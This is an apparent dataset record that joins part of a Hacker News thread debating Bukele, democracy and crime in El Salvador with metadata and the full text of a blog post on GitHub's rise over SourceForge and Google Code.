stories: Brazil, India, much of China's economic boom came from liberalizing and moving toward democracy (a process reversed by Xi), Eastern Europe, Japan, much of Taiwan's and S Korea's boom's. Singapore was mostly (but not sufficiently) democratic. In fact, there is no other form of government that is remotely close. All the wealthiest, most free countries in the world are democracies. Also, we have become so steeped in nationalism that we miss the true goal and point of it all: The freedom and prosperity of individuals. Raising aggregate wealth is not the goal - as we have seen recently, that means nothing to the people it doesn't benefit. Dictators and their syncophants say, 'only we can just ignore human rights, property rights, etc. and do X'. That doesn't help their victims. Democracy ensures that everyone has a seat at the table (imperfectly, and we can do it better - and we will do it faster if you'll help). reply numeri 6 hours agorootparentprevI believe this was one of Machiavelli's big arguments in The Prince – that sometimes a country in crisis needs a single strong leader/monarch/dictator, using cruelty if necessary to keep control and bring stability. reply roenxi 7 hours agorootparentprevThe interesting one to watch out for is how often democracies form with the support of an existing democracy - I only have a loose understanding of the history but France seemed to have an outsized role in the US becoming what it is today. The failures (USSR, Republic of China for example) where democracy doesn't take on a wide scale are probably also interesting studies. The key problem in setting up a democracy is that people are, on average, pretty dense. Doing things by vote doesn't cause stupid people to make good decisions. There is a real cultural element where the people involved have to be strongly against solving domestic problems with force, for evolution over revolution and also big believers in general liberty (otherwise you just get two factions fighting to use the big stick of government against the other). reply bitcurious 7 hours agorootparentRe: France and the United States, you have the timeline mixed up a bit. France & the French intellectuals of course played a large role in the American revolution, but it was America that became a democracy first. Lafayette, one of the key players in the French Revolution, served under Washington and lead troops in the US before coming back to France and playing a key role in the founding of the First Republic. reply philwelch 6 hours agorootparentI don’t think France successfully became a democracy at all during the Revolution; the First Republic quickly fell into the mass murdering reign of terror under Robespierre, who was ousted by the Directory, who remained in power for four years until Napoleon’s coup. Lafayette himself was basically driven out of France by the radicals. On the other hand, Britain itself was already fairly democratic by 1776, and the thirteen colonies had their own representative government institutions. The point of complaint was that the British were simply ignoring those institutions and flagrantly violating the traditional rights that Englishmen were entitled to. And a lot of the British were sympathetic to this viewpoint so there wasn’t the political capital to crack down on the rebellion as harshly as Britain would do in various other colonies at other points in time. And aside from Lafayette, the French monarchy—the same absolute monarchy the Revolution sought to overthrow—was the regime that supported American independence, mostly out of “enemy of my enemy is my friend” considerations. reply bluish29 7 hours agorootparentprev> The interesting one to watch out for is how often democracies form with the support of an existing democracy The more interesting one is how often a democracy can survive against democratic superpower wishes. I.e, during the cold war era, the US helped taking down more democratic governments than the USSR itself. That is a bit of ironic remark. People tend to forget that the US didn't like democracies outside its sphere of influence in the last century. I am sure this legacy gets blind eye when people usually talk about democracy and why many people doesn't like it. The scars are still alive til this day (Iran is the prime example here). reply philwelch 6 hours agorootparentIran had already ceased to be a democracy by the time the coup happened. That was actually one of the precipitating causes for the coup, which had a ton of popular support at the time. Mossadegh was essentially a dictator ruling by means of emergency powers at the time he was overthrown, and even before that point, he had also interfered with the 1952 parliamentary election by stopping the counting of votes once the minimum quorum of MP’s had been elected. reply sib 7 hours agorootparentprev>> The interesting one to watch out for is how often democracies form with the support of an existing democracy - I only have a loose understanding of the history but France seemed to have an outsized role in the US becoming what it is today. I'm not sure that you could say that France was a democracy in the late 18th century (1770's, 1780's) - the critical time for the creation of the US and its form of government. reply kaladin-jasnah 7 hours agorootparentprevROC is a democracy today (although it was a one party state with the KMT for a long time), do you mean the PRC or am I misunderstanding your comment? reply nemo44x 7 hours agorootparentprevYou need a monarch to breed an aristocracy that takes care of its home by virtue of having skin in the game. A fake democracy immediately dissolves into an oligarchy which is self interested and will take whatever it can for itself up until the point a strong king rises up and smashes it. In this case Bukele. reply imtringued 1 hour agorootparentprevThe thing is, naive democracies believe that the IMF is giving them advice in their best interest, but in reality most countries that sent from developing to developed status had to break most of the IMF rules. I'm talking about countries like Japan. reply ks2048 7 hours agorootparentprevWhat are your top examples of autocratic success stories? reply nordsieck 7 hours agorootparentI assume they're counting South Korea. Singapore is probably also up there, although I don't know enough about the country to know just how democratic it's democracy really is today. reply throwme_123 7 hours agorootparentprevit works in civilization (the game) too switch to democracy for a long time and it's a mess reply GaggiX 7 hours agorootparentprevI would think of the Third Polish Republic. reply RcouF1uZ4gsC 7 hours agorootparentprevI think democracy needs a “Deep State” to succeed. This can be imposed by a time of autocracy gradually evolving into democracy - see the UK, imposed during colonialism and then taken over after independence - see the Indian Civil Service, Courts, etc, or imposed by an occupying force - see Germany. Without that “Deep State” it will degenerate in alternating bouts of violence until people cry out for autocracy - See Roman Republic. reply nocoiner 7 hours agorootparentMy general working thesis is that 99.9% of the time when people refer to the “deep state,” they just mean “the state.” Aren’t you just referring to regular government institutions or is there something I’m missing from your comment? reply macintux 6 hours agorootparentCan’t speak to the original comment, but I think part of a “deep state” is institutional inertia/tradition. A state without that deep-rooted sense of continuity is much more fragile. Having a civil service without political allegiance seems to be critical to preservation of a democratic system. reply SV_BubbleTime 5 hours agorootparentWhy are you under the impression that the bureaucracy class does not have a political leaning/allegiance? We know it does, 95% of DC votes for the people that want larger government. reply macintux 5 hours agorootparentAllegiance is not the same thing as a tendency. And the fact that one party uses smaller government as part of its sales pitch may not last forever. In the U.S. I would say that Trump’s takeover of the GOP has generally de-emphasized smaller government as a plank of the party. He certainly doesn’t care about it. Whether the bureaucrats lean towards one party or the other doesn’t change the fact that they aren’t compelled out of fear for their jobs to break the law at the president’s command. reply SV_BubbleTime 5 hours agorootparent> Whether the bureaucrats lean towards one party or the other doesn’t change the fact that they aren’t compelled out of fear for their jobs to break the law at the president’s command. I’m thinking about all of the politically motivated “leaks”, the weaponization of institutions like the FBI, DOJ, IRS and I’m just wondering how you are seriously saying above. The “deep state” or “the state” or “the elites” or “ the bureaucracy class” or whatever you want to call it and whatever you want to claim it exists for… is a different topic than “they don’t break the law”. I’m thinking I must be really misunderstanding your text, because that’s just ridiculous. reply macintux 5 hours agorootparentThe thesis that started this thread: the deep state protects democracy. Obviously if you interpret “deep state” as “secret cabals of evildoers” then yes, that’s a nonsensical argument. My personal interpretation of the “deep state” argument that Trump has been bandying around is that he means “people who resist my desire to do whatever I want as President”. reply searealist 4 hours agorootparentprevThe \"deep state\" organizations skew 90%+ Democrat. reply Kamq 6 hours agorootparentprevGenerally speaking, the term \"deep state\" refers to informal power structures within the state apparatus that work against the will of the people. Which... can be a government institution... but not generally in a democracy. reply coldtea 6 hours agorootparentprev>I think democracy needs a “Deep State” to succeed That's the very thing that kills a democracy (both the system of government, and a country that develops one). reply Sniffnoy 3 hours agoparentprev> then hes in a good place to introduce some kind of monarchy I'm quite skeptical that that's the case. The basic problem is that a monarchy has an entirely different source of legitimacy from a modern popular dictatorship like Bukele's. What examples are there of this transition happening successfully? I guess you could maybe count North Korea, but even they haven't actually declared a monarchy... I could perhaps imagine it happening there, but that's a real extreme special case. A much more ordinary case like Bukele, I don't see it. reply jrflowers 7 hours agoparentprev> democracy doesn't deal with gangs well enough to make a country like this functional What makes El Salvador a “country like this” that is incompatible with democracy as compared to other countries reply coldtea 6 hours agorootparentThe practical experience of 20th century Latin America countries, and their history, both regarding domestic politics and dynamics and external influence and meddling? reply jrflowers 6 hours agorootparentThis makes sense. Latin America is incompatible with democracy and the reason for that is history; such a conclusion is so obvious it is a surprise that anyone would support the idea of democracy anywhere in the continent reply infamouscow 6 hours agorootparentprevIn a democracy, over the long term, short term interests win out over long term interests. This is true of both the citizens and the politicians. In a monarchy, long term interests win out over short term interests because they're dynastic and stay within a family. There is a natural incentive for long term thinking that comes with a monarchy. reply jrflowers 6 hours agorootparentThis makes sense. Kings are smarter and more selfless than bodies of democratically elected officials. One needs look no further than King Maha Vajiralongkorn for a contemporary example of a man that benevolently liberated his country from the hassle of managing its wealth reply optimalsolver 7 hours agoparentprevHe could give the new dynasty of autocratic rulers some innocuous title like Mayors. reply nemothekid 4 hours agoprevThis is a great article; I didn't think I would read the whole thing but AFAIK, its a reasonable thorough account on the rise of Bukele. As an aside, I find it incredibly amusing that the China-funded library is decorated with rather Western culture - Harry Potter, Star Wars, and even Mario. Even Chinese money is used to uphold American cultural hegemony. reply sdsd 4 hours agoparent>Even Chinese money is used to uphold American cultural hegemony. It makes me think of German barbarians who, after sacking the urbs aeterna, couldn't think of a better name for themselves than Holy Roman Empire. reply cjbgkagh 4 hours agoparentprevI make a distinction between western culture of Magna Carta onwards as distinct from mass marketed corporate manufactured culture. Encouraging the later probably serves Chinese interests. reply nemothekid 4 hours agorootparent>as distinct from mass marketed corporate manufactured culture From a hegemonic view, I don't. The \"mass marketed corporate manufactured culture\" ensures that the West retains an avenue for soft power in the country. As long as they watch american tv, play american games, and read american stories, the country is subtly primed to be more palatable to American view points. It might not matter now, as Bukele has demonized Western influence; but as shown in Asia, Pokemon and Mario were massively effective in cleaning up Japan's image in the eyes of Korean youth. Both China and Korea were brutally colonized by Japan, but cultural influence has inverted the favorability of China and Japan in Korea. I don't see how repeating that mistake favors China interests. [1] In fact, according to a survey published by news magazine SisaIN, China’s favorability among South Koreans reached a high-water mark in 2016 at a score of 60 out of 100—second only to the United States (73) and higher than Japan (43) and North Korea (28).6 However, by 2021, China’s score had fallen by half to 26.4 [2] I don't deny COVID could be a factor here. https://www.americanprogress.org/article/rising-anti-china-s.... reply rablackburn 4 hours agoparentprev> (...) and even Mario Cool Japan would like a word with you ;) reply nemothekid 4 hours agorootparentI know Mario (and Pokemon) displays are Japanese, but they are still interesting given China's relationship with Japan (although the rest of the gerontocracy Asia doesn't have a particularly favorable view of Japan either). reply kovezd 4 hours agorootparentprevCuriously, Mario's inception was a result of Nintendo's expansion to America, and the need to provide arcade games with a relatable narrative. reply arp242 4 hours agoparentprevHarry Potter is British and Mario is Japanese... reply nemothekid 3 hours agorootparentThe Harry Potter movies were directed by an American, written by an American, published and distributed by an American studio. Today, the franchise is owned by an American company. Mario was named after an American and inspired by an American cartoon character I know where these characters originated from, and their global presence is distributed by American cultural hegemony. Trying to one-up me by denying the American influence and amplification of these franchises is senseless reply arp242 2 hours agorootparentBy this logic Monty Python is also American. And St. Patrick's Day. And magna. And sushi. And many other foreign things that's also popular in the US. reply lentil_soup 3 hours agorootparentprevThe Harry Potter movies are not directed by an American. They have different directors, 2 out of 8 movies are directed by an American, the others British and one Mexican reply math_dandy 8 hours agoprevI really like how the author enumerates and links to his most important sources right in the introduction. reply roshin 4 hours agoprevIf the extremely low crime rate is true, that is amazing. However, my concern is that as a de facto dictator, he can fudge the statistics. Just like Mussolini was credited for making the trains run on time only to later be found out that he simply forced the news to report that the trains ran on time. Although, if, as the author writes, people on the street love him and they all claim that crime is down. Then maybe the ballpark figure is right. reply 1270018080 4 hours agoparentI think this reduction in crime is only temporary. You still have a poor country full of desperate people, and it's only a matter of time before the criminal enterprise vacuum gets filled by the next generation. The slate did get wiped clean, but the root cause is still there. reply ip26 4 hours agorootparentA protection racket fills a power or monopoly on violence vacuum. The current government would seem to be filling this vacuum today. reply 1270018080 3 hours agorootparentI mean an \"economic surplus\" vacuum. There's lots of money to be made doing human and drug trafficking and the whole market in a country just got wiped out. And the citizens there are still poor. So it's only a matter of time before a group fills the void. reply wolverine876 4 hours agoparentprevWhen the government is the most powerful gang, with all the firepower of government, then they can seize power and overcome other gangs. But that doesn't reduce the gangs in people's lives. reply azinman2 4 hours agorootparentExcept the gov there wasn't able to do that until recently. Haiti has zero chance of it, Mexico let it infiltrate to include the former president, and the US has been unable to largely stomp out its gangs. I understand you were trying to make a cynical point about govs, but I don't think it's even true. reply optimalsolver 7 hours agoprevBe sure to check out his Notes on the Gambia, which for some reason is the world's premier destination for female sex tourism: https://mattlakeman.org/2023/07/10/notes-on-the-gambia/ reply doublepg23 6 hours agoprevWow that was a fantastic read, didn’t expect to get completely sucked into that. reply melling 8 hours agoprevI backpacked through El Salvador in 2007. I don’t remember people saying it was particularly dangerous. Honduras was the place I was told to skip, unless you wanted to scuba in Roatan There were other backpackers in the hostels. Even Colombia at that time was fine. reply flextheruler 7 hours agoparentUnfortunately most El Salvadorians are not backpacking through their country for recreation. It’s an assuredly different set of circumstances if you’re living there and from there. reply grecy 8 hours agoparentprevThey all still are fine. I drove the entire pan American highway from Alaska to Argentina from 2009 to 2011. I have dozens of Friends that have done it, and I moderate a Facebook group where thousands are doing it right now. As the marketing for tourism Colombia goes “the only danger is you’ll never want to leave” reply cageface 7 hours agorootparentThis is absolutely not my experience or the experience of many people I know that have traveled in the region. Latin America is great but the safety concerns are real. reply ks2048 7 hours agorootparentI've lived in Guatemala for 4.5 years (I'm from the US) and traveled in every country in Central America, and have had only positive experiences. Guatemala is a great country, but difficult for local people because it's hard to make good money. The violence problems are real, but much safer than its reputation, in my opinion. reply cageface 6 hours agorootparentCrime is a numbers game. And certainly you can improve your odds by be being mindful of where and when you're exploring. I wouldn't let fears of crime discourage anyone from visiting Latin America but compared to many other parts of the world you need to be much more aware of what's going on around you. reply someplaceguy 7 hours agorootparentprevHmm... possibly a literal survivorship bias at work here? :) reply ks2048 6 hours agorootparentSure, that's part of it. The stats are the stats - the rest is anecdotes. But, with experience in a place you realize the crime is concentrated to certain places and groups of people. reply noduerme 5 hours agorootparentFor reference, is it safe now to drive yourself from Antigua to Guatemala City at night? That used to be a dicey proposition. reply rsync 5 hours agorootparentprev\"I drove the entire pan American highway from Alaska to Argentina ...\" How did you cross that part of Colombia that is impassable and has no road and blah blah blah ? Genuinely curious as I was dissuaded from a similar trip by the supposed inability to go all the way through Columbia. reply ojbyrne 5 hours agorootparentYou take a ferry. https://www.fodors.com/world/mexico-and-central-america/pana... reply schoen 3 hours agorootparentThat ferry isn't currently operating. (If you follow the link, the operator's site has been replaced with a domain squatter site.) I've read a number of articles about the Darién Gap, and they all indicate that there have been several ferry operators in the past, in some cases for years at a time, but that there's currently no regularly scheduled service. For example, Wikipedia states this several times https://en.wikipedia.org/wiki/Dari%C3%A9n_Gap Wikivoyage suggests that you can make it by boat if you're willing to fly part of the way, and/or that you can make private arrangements with a shipping company that can transport cars. https://en.wikivoyage.org/wiki/Darien_Gap My understanding from these and other articles is that people with enough money can buy access to sea transportation for themselves and/or their cars, but that you can no longer just buy a ticket for any kind of regularly scheduled departure. But this could conceivably change again in the future. reply grecy 3 hours agorootparentprevI shipped in a shipping container. I documented the whole process here http://theroadchoseme.com/shipping-across-the-darien-gap-pt-... reply FabHK 6 hours agoprevGreat informative article. Note that \"M-13\" is often used for MS-13, and \"M-18\" (erroneously?) for B-18, which can be a bit confusing. ETA: It's not erroneous, as that gang is known as either Barrio 18 or Mara 18. At any rate, ignore the letters - it's 18 vs 13. reply deanresin 7 hours agoprevI read an article a while ago that showed a correlation between the violent crimes per capita and how close to the equator that country was. Basically, the hotter the climate, the more crime. reply sexy_seedbox 6 hours agoparentLink the article? Sounds badly researched as Belarus and Russia are cold places with a lot more crime than hotter places in East and South East Asia. reply bombcar 5 hours agorootparentIt is probably \"somewhat\" true when accounting for all possible variables, as the better the weather the more time people spend outside. Crime rises in the summer in most areas, iirc. reply mixmixmix 2 hours agorootparentprevYou’re greatly misinformed. Russia and Belarus are tons safer than your average American or Western European city. reply megapolitics 1 hour agorootparentThat’s just not true. The violent crime rate in Russia is many times that of any Western European country, and their intentional homicide rate is slightly higher than America’s. In terms of murder rate Belarus sits much closer to Western Europe than America, but it still sits above Western Europe. reply tayo42 2 hours agoprevSkipping El Zonte (aka bitcoin beach) but covering btc use seemed like an odd choice. I was told it was mostly used by bitcoin tourists and foreign idealists. It was funny being told by a shop they don't accept credit, but only bitcoin or cash lol. Skimmed it, interesting thoughts overall. reply jeffbee 7 hours agoprevAt first I thought the site disabled the scroll bar with CSS, then I realized that scroll bar is subatomic because the article is seven miles long. reply julienreszka 4 hours agoprevDespite the lengthy article I have so many questions and suspicions. For example: If the elections are rigged how did he “win” If he is responsible for the crime reduction, how did he do it in such a short time, how were the police trained so fast If the original crime reduction was due to gangs hiding the bodies is it really that unreasonable to think that what actually is happening is that the government is more effective at hiding the bodies? reply 29athrowaway 5 hours agoprevExtortion was the main crime in El Salvador. Asking people for a share of their income. The cure to mass extortion is carrying weapons, or making the extortionist believe there is a good chance you have a.weapon. There is no other mitigation. reply perryizgr8 5 hours agoprev> Like all educated middle-class Americans, my core understanding of urban crime comes from The Wire Lol this is accurate for people like me too who know almost everything they do about America from TV shows reply Cornbilly 6 hours agoprev [–] Who is Matt Lakeman? Why should I care about his analysis/opinions on El Salvador? reply leansensei 4 hours agoparent [–] Who are you? Why should Matt Lakeman justify himself to you? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "High homicide rates in El Salvador have a historical backdrop, with recent declines credited to President Nayib Bukele's anti-crime initiatives.",
      "Factors like US deportations and the aftermath of the civil war led to the emergence of powerful gangs such as MS-13 and B-18.",
      "Despite efforts to curb gang violence through crackdowns and truces, it persists as a major challenge, fueling debates over Bukele's strategies and their impact on democratic norms, amidst ongoing issues with poverty, instability, corruption, and economic consequences of gang activities."
    ],
    "commentSummary": [
      "The discussion encompasses various topics such as the impact of drug gangs, the differences between dictatorships and democracies, and challenges in establishing and maintaining democracies.",
      "It explores historical and modern democracy forms, economic growth in different political systems, and the need for responsible leadership in governance.",
      "The debate expands to include comparisons of democracy, autocracy, and monarchy, mentioning the \"Deep State,\" American cultural influence globally, safety concerns, crime rates in Latin America, and the potential impact of climate change on crime rates."
    ],
    "points": 213,
    "commentCount": 149,
    "retryCount": 0,
    "time": 1711838783
  },
  {
    "id": 39874583,
    "title": "How GitHub Revolutionized Code Hosting and Collaboration",
    "originLink": "https://graphite.dev/blog/github-monopoly-on-code-hosting",
    "originBody": "I’ve been writing code since high school. I have faint memories of creating an Android game with a friend using Tortoise SVM to share code. At college, I learned to clone GitHub repos to access CS homework assignments. Later, during internships, I joined the ranks using GitHub to review and merge PRs. Most developers who came to professional age during the last decade probably had a similar experience to me - GitHub is synonymous with source code and code changes, whether with open source projects or on private company teams. It’s easy to take GitHub ubiquity for granted - but how did things get this way? I asked my teammate, David, how he came to discover GitHub. He’s who’s been coding a decade longer than I have, and lived through the professional transition. Throughout the 2000’s, he recounted using SVN at programming jobs. He would download software from SourceForge but considered the UI utilitarian and “crappy.” Eventually, he found himself navigating to GitHub more and more often to find documentation and download open-source tools like Rails. This lead him to read up about Git and eventually use a git-to-svn translator at work. But even up until 2010, many companies were still hosting code on SVN, and it wasn’t until years later that most private organizations migrated fully to Git. David’s anecdote only piqued my interest further. How did GitHub enter the market? What existed before, and what gap did they fill? The world before GitHub Four years before GitHub was founded, in 2004, Linus created Git. While many folks still used SVN, Git was growing rapidly in popularity as a distributed version control system. It came with compelling value. Unlike prior tools like CVS and SVN, Git users could host entire copies of source code on their computers without needing to communicate to a centralized server. Folks could update code (even offline!) and share copies with one another without the approval (or hosting costs) from a centrally managed source. And while branching code in SVN required duplicating the entire repository, creating branches in Git was fast and cheap. As one can imagine, these improvements led to an explosion of creative development in the open-source community. Git was custom-built for distributed democratized development, and spread virally. Despite its advantages, however, Git was slower to catch on to corporate codebases, which remained reasonably well served by private centrally managed SVN servers with legacy workflows. Skip forward four years to 2008. Open-source projects like Rails were following Linux and were starting to adopt Git. Private organizations continued using SVN and Perforce servers to centrally manage source code. Open-source software was distributed primarily on SourceForge, later Google Code, or rarely on alternatives such as personally hosted servers. SourceForge, despite its dominance, left much to be desired. For one, the site didn’t offer Git support until 2009, over a year after GitHub was created, and had climbed to over 100k users. But the differences ran deeper than the technology. Today, when we think of online code hosting, we think of a website you can visit to browse the code, issues, and contributors seamlessly. That was not the SourceForge experience. Rather, it and alternatives like Google Code focused on software distribution to end users, not code collaboration. They solved half the puzzle by aggregating the distribution of open source projects - but offered little in the form of comments, code browsing, change reviews, and other modern table stakes features. It gets worse. Creating and managing repositories on SourceForge was painful. For one, the site required an application and human approval to create a new repo. Furthermore, private repos were never supported, meaning the site was never useful for closed-source hosting. Leaving comments and issues on projects was unintuitive, and forking was an uncommon practice. If you wanted to contribute to a project, the most common way was to generate a patch and then send it over the project’s mailing server - rather than forking and opening a pull request back to the project. Learning about SourceForge 20 years later, I'm struck by how similar it sounds to the current Apple App Store. In that light, the gap in the market GitHub could fill is more clear. The incumbents: SourceForge and Google Code Check out SourceForge’s landing page back in 2008: What do you notice? Proud claims about being the largest open-source focused site on the web. Download numbers, and highlighted projects. New software version releases, even an advertisement on the right column. But no mention of Git, no focus on user profiles, and no private repos. The focus is on distribution, not developer collaboration. Example of a repo on SourceForge. Notice how the main call-to-action is a download button, rather than a clone button. code.google.com was incrementally better than SourceForge. The site focused on making it easy to host code and documentation for free. It leveraged Google’s great search acumen for discovery and offered thoughtful documentation for developers looking to learn. But critically, it lacked social and collaborative features which would later prove so powerful for open source developers. Lastly, while it launched with SVN support, Google Code didn’t add support for Git hosting until 2011 - complete with a sassy-titled Wired article. Finally, the invention of GitHub One evening in 2008, Tom Preston-Werner and Chris Wanstrath met for a drink at an SF sports bar after a Ruby on Rails meetup. The Rails community was starting to use Git more and more, but there was no central website like SourceForge for hosting Git repos. Moreover, social networks were clearly taking off, but no such social network site existed for developers like them working on open-source projects. Git had made collaborative software development easier than ever, and sites like SourceForge helped distribute versioned releases - but no site served as a home for collaboration. What if anyone could host source code, discuss issues, and request maintainers to pull in forked changes - all backed with profile pages and comment feeds like Facebook? The soon-to-be GitHub cofounders began hacking on the first version of GitHub as a weekend project. They developed the bare bones of GitHub (using Rails, of course) on the weekends until it was complete enough to work at Chris’ day job. Through daily dogfooding, they worked out kinks and fixed any blocking feature gaps. “GitHub the company had sort of sprung up from this side project, so we never had any big vision or dream or aspirations. We just wanted to work on something cool.” -Chris Wanstrath The Ruby on Rails creator was also an early user of GitHub, helping to skyrocket the site’s early popularity. How GitHub looked in 2008 GitHub’s original logo included “Social code hosting” and their H1 brand promise read: “Git repository hosting, no longer a pain in the ass.” There could be no confusion - GitHub launched with two core value adds: social network features and the ability to host Git repos online. No other site competed on these terms. Project and Developer News Feeds: Keep tabs on your favorite projects and the people that work on them. Source Code Browser: Easily view your code at any version and on any branch or tag. Public Developer Profiles: See what other developers are working on and how many commits they've made. “Killer apps make or break any platform. With GitHub, I think the Git hub just scored one.” —David Heinemeier Hansson “What’s amazing about GitHub is how it really brings the social aspect into play. Chris and Tom are showing us all visually how git development is supposed to work. I know I personally had some bing moments once I started pulling in commits from external git repos.” —Rick Olson “You’ve probably heard this at least twelve times in the last week, but GitHub is totally badass. I’ve never had a reason to put my code up on a hosting service like that before, but now I do.” —Josh Susser GitHub’s rapid growth After dogfooding the MVP, the GitHub cofounders launched a free beta to friends for hosting public repositories. GitHub’s growth in the open-source community was explosive, demonstrating a great product market fit. It was quickly adopted and enforced by the Rails project, meaning anyone wanting to use Ruby on Rails had to interact with GitHub. (That’s how folks like my teammate David first learned about GitHub and Git). In its first year, GitHub grew to host 46,000 public repositories. The next year it grew to 90,000 repositories and 100,000 users. In year three that number grew to 1 million repositories, and by 2011 GitHub surpassed SourceForge and Google Code in scale. Despite the rapid early growth, the three founders remained frugal and bootstrapped. They worked to generate revenue quickly. Rather than focusing on ads as SourceForge had, or enterprise sales as Perforce did, the GitHub founders quickly began selling individual tier subscriptions for hosting private repos. The model was easy to understand, self-serve, and somewhat original in the space compared to other hosting products and social network sites. Not only did Google Code and SourceForge not host Git repos, but they also had no option for private code hosting. Outside of GitHub, the only option for private repository hosting was running a personally managed server. Beyond quick revenue from subscriptions, the GitHub cofounders found alternative ways of making and saving money. They experimented with alternative revenue streams such as one-off ad spots, a merch store, git training services, and a jobs board. To keep business costs as low as possible, GitHub partnered with Engine Yard, and later Rackspace, offering footer advertising in return for free hosting. In 2009, GitHub launched a self-hosted version that enabled larger enterprises to run GitHub. Instead of using SVN servers or products like Perforce, engineers could use their newfound Git tooling for both open-source and closed-source development. A GitHub plan for organizations and teams launched in 2010, further pushing into the private market for code hosting and change collaboration, and in 2011, they rebranded Github Fi into a formal enterprise server product. “Our GitHub Enterprise product was created to help us spread GitHub to more people. So whether you're stuck behind a firewall or have full access to the web, we want GitHub to work for you.” -Chris Wanstrath By innovating on traditional code-hosting business models, GitHub earned enough money to scale its team and iterate on the product experience further than any previous product. But the deep revenue focus and bootstrapped growth wasn’t just a choice—VC investment wasn't an option for the cofounders. Up until 2010, “companies making developer tools failed to attract any significant investment. \"Even when tools companies saw exits such as the 2013 Facebook acquisition of Parse, the maker of tools for mobile apps, the reported $80 million was considered on the low side. For some, developer tools would always remain a venture capital (VC) dead zone.\" -Forbes It took investment traction from Heroku, Atlassian, Stripe, Twilio, and Sendgrid to help open up the market. Only after six years did GitHub raise investment from a bold Andrewson Horowitz - 100 million dollars for what was marketed as the largest series A ever. Who didn’t adopt GitHub? Google never adopted GitHub internally. Throughout the 2000s, they used Perforce and later developed a custom version control system named Piper. Not only did Google have unique advanced version control tooling, but to my knowledge, they also invented web-based code reviews. Their early code review dashboard from 2004 took inspiration from Gmail and set a gold standard for corporate software development workflows. They had no immediate need for Git and GitHub. Facebook also never adopted GitHub for internal development. Around 2010, Facebook’s Evan Pricely developed Phabricator in 2010 - a year before GitHub formally launched enterprise self-hosting. Even if GitHub’s offering had been available, it’s likely Facebook would have still opted to develop their own tooling to better integrate with tailored internal solutions and to help handle monorepo scale that even raw Git struggled to keep up with. What's more, Facebook moved off Git to Mercurial, which GitHub never developed formal support for. Some unicorns, such as Airbnb, adopted GitHub early on. Other notable companies, such as Uber and Pinterest, self-hosted and forked Phabricator. While I'm not certain, I suspect those who chose Phabricator did so because 1) it was the best self-hostable and open-source source control service and 2) they were filled with ex-Facebookers missing their former toolchain. GitLab launched in 2011 and counter-positioned against GitHub by focusing on being a complete dev-ops platform, rather than “social coding”. They tagged onto the booming trend in DevOps and leaned heavily on CI/CD to gain market share in some major tech companies, such as Nvidia. Working on Graphite in 2024, I speak with hundreds, if not thousands, of high-tech engineering teams. It is exceedingly rare that I hear about companies that don’t use GitHub. StackOverflow’s 2022 survey claims that GitHub’s professional market share is only double GitLabs. But in practice, I’d anecdotally say that 95% of modern tech companies use GitHub, and only a handful of those companies self-host GitHub enterprise. The remaining few either use GitLab, Phabricator, or Gerrit or have custom-built an in-house code hosting platform. The future of GitHub and code hosting Linus Torvalds, the original developer of the Git software, has highly praised GitHub by stating \"The hosting of github [sic] is excellent. They've done a good job on that. I think GitHub should be commended enormously for making open source project hosting so easy.\" However, he also sharply criticized the implementation of GitHub’s merging interface, stating that \"Git comes with a nice pull-request generation module, but GitHub instead decided to replace it with their own totally inferior version. As a result, I consider GitHub useless for these kinds of things. It's fine for hosting, but the pull requests and the online commit editing, are just pure garbage.\" -Wired What's the future of code hosting? In Clay Christensen’s famous book, The Innovator’s Dilemma , Christianson argues that early innovative products often start as integrated solutions. I would argue that GitHub and GitLab are examples of integrated offerings, offering a one-stop shop for teams looking to manage their source code. Christensen argues that as a market matures, solutions become specialized and modular. We've already seen this begin to happen in a few areas of “social coding.” Jira and Linear offer modular issue tracking, while Jenkins and Buildkite offer modular CI solutions. GitHub was the original Git repo hosting solution, but in time, BitBucket, AWS Code Commit offered the same solution. GitHub now offers an integrated merge queue, but more specialized offerings now exist from Mergify, Aviator, Trunk, and Graphite. GitHub maintains a monopoly over open-source code due to strong network effects and product features like forking, forum-style comments, and moderation that lend themselves fantastically to open-source development. Closed-source repos originally adopted GitHub due to their specialization in Git hosting - but that has now become a commodity capability. GitHub’s social features are nearly useless at private companies, where discussions happen over Slack, Notion, Linear, and Zoom. I believe the future involves a bifurcation between dev-tools for open-source and dev-tools for closed-source. Open-source collaboration needs discussions, profiles, moderation, forking, and discovery. Closed-source collaboration needs code changes to be reviewed in hours, not days. It needs trunk-based workflows, merges queues, emergency procedures, and CI/CD coordination. There’s overlap in both cases, but I believe, over time, the world will further specialize in different solutions for the different use cases. We’ve already seen specialized solutions from Facebook and Google. By evolving their source control systems independently from GitHub’s open-source constraints, they’ve created powerful patterns like Google’s PR inbox and Facebook’s stacked diffs. I’d like for modularization to progress to a point where every engineer can pick how they’d like to host their source code, completely independently of the tools they’d like to use to change that source code. We already see this in other facets of development, such as how developers are free to use their preferred IDE, or their preferred cloud hosting provider. GitHub earned their monopoly fair-and-square by better specializing into code hosting and social coding - but they’re not the end of the story. One day in the future, I hope developers have five viable options on where to host, not just one. 💡 Disclaimer: I’m young enough to have not been professionally coding before GitHub. Much of the information in this post is cobbled together from online sources, interviews, and learnings I’ve had working in the space. It’s my best approximation of how things came to be and where they’re heading. The full timeline 1999: SourceForge goes live, becoming the first free open source hosting provider. Pre-2004: Use of CVS and SVN for version control; SourceForge leads in hosting open-source projects. 2004: Linus Torvalds creates Git, revolutionizing version control with a distributed system. 2006: Google Code launches, initially supporting SVN. 2008: GitHub founded, offering Git repository hosting with a focus on social coding. 2009: SourceForge adds Git support; GitHub introduces a self-hosted version, laying the groundwork for GitHub Enterprise. 2010: Facebook develops Phabricator, a suite of web-based tools for code review and software development. 2011: GitLab founded, emphasizing a complete DevOps platform; Google Code adds Git support. 2012: GitHub launches GitHub Enterprise, catering to larger organizations' needs for private hosting. 2016: Google Code shuts down, highlighting GitHub's growing dominance in code hosting. 2018: GitHub introduces GitHub Actions, automating workflows within the software development process. 2021: Phabricator is no longer actively maintained, pushing more users to GitHub",
    "commentLink": "https://news.ycombinator.com/item?id=39874583",
